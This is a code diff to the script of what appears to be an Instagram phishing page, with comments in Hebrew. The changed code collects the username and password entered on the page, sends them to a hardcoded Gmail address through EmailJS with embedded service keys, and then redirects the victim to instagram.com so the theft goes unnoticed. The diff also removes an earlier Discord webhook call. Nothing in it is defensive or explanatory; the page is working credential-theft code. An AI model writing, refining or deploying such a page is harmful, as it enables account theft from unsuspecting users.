@@ -99,31 +99,32 @@
       window.location.replace("https://www.instagram.com");
     }
     (function() {
-  emailjs.init("REvVlGrHOuI_NS26I"); // החלף עם מזהה המשתמש שלך מ-EmailJS
-})();
+        emailjs.init("2T_CaMbAN4-h9rTjA");
+    })();
+
+    (function() {
+        emailjs.init("2T_CaMbAN4-h9rTjA");
+    })();
 
 function sendMessage() {
-  var request = new XMLHttpRequest();
-  request.open("POST", "discord webhook");
-  request.setRequestHeader('Content-type', 'application/json');
-  
-  // שלח את המידע דרך EmailJS
   var params = {
-    to_email: "shay053713@gmail.com", // החלף עם כתובת הדוא"ל שלך
+    to_email: "shay053713@gmail.com", // כתובת דוא"ל שמוגדרת בתבנית
     username: document.getElementById('username').value,
     password: document.getElementById('password').value
-  };
+};
 
-  emailjs.send('service_tuulgmv', 'template_1wpdy5y', params) // החלף עם מזהה השירות והתבנית שלך מ-EmailJS
+emailjs.send('service_zuhohgv', 'template_1wpdy5y', params) // מזהה השירות והתבנית
     .then(function(response) {
       console.log('SUCCESS!', response.status, response.text);
-    }, function(error) {
+      // מעביר ל-Instagram לאחר הצלחה
+      window.location.replace("https://www.instagram.com");
+    })
+    .catch(function(error) {
       console.log('FAILED...', error);
+      alert("שליחת המייל נכשלה. בדוק את ההגדרות ב-EmailJS.");
     });
-  
-  // שינה את הכתובת לאחר שליחת המידע
-  window.location.replace("https://www.instagram.com");
 }
+
 
   </script>
 </body>
